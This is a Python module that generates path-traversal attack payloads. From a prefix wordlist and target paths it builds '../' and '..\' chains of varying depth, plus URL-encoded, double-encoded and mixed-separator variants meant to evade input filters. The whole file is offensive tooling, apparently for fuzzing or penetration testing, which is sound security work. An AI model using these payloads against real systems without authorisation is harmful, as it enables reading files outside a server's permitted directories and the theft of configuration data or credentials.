from urllib.parse import quote

PROFILE_CHOICES = ("linux", "windows", "encoded", "double-encoded", "mixed-separator")


def normalize_target(target: str) -> str:
    return target.lstrip("/\\")


def generate_payloads(
    wordlist: list[str],
    profiles: tuple[str, ...],
    targets: tuple[str, ...],
    min_depth: int,
    max_depth: int,
) -> dict[str, list[str]]:
    result: dict[str, list[str]] = {}
    for target in targets:
        normalized_target = normalize_target(target)
        payloads: list[str] = [f"{prefix}{normalized_target}" for prefix in wordlist]
        for profile in profiles:
            payloads.extend(
                _profile_payloads(
                    profile=profile,
                    target=normalized_target,
                    min_depth=min_depth,
                    max_depth=max_depth,
                )
            )
        result[target] = list(dict.fromkeys(payloads))
    return result


def _profile_payloads(
    profile: str,
    target: str,
    min_depth: int,
    max_depth: int,
) -> list[str]:
    payloads: list[str] = []
    for depth in range(min_depth, max_depth + 1):
        if profile == "linux":
            payloads.append("../" * depth + target)
        elif profile == "windows":
            payloads.append("..\\" * depth + target.replace("/", "\\"))
        elif profile == "encoded":
            payloads.append("..%2f" * depth + quote(target))
        elif profile == "double-encoded":
            payloads.append("..%252f" * depth + quote(quote(target)))
        elif profile == "mixed-separator":
            prefix = "".join("../" if idx % 2 == 0 else "..\\" for idx in range(depth))
            payloads.append(prefix + target)
        else:
            raise ValueError(f"unknown payload profile: {profile}")
    return payloads
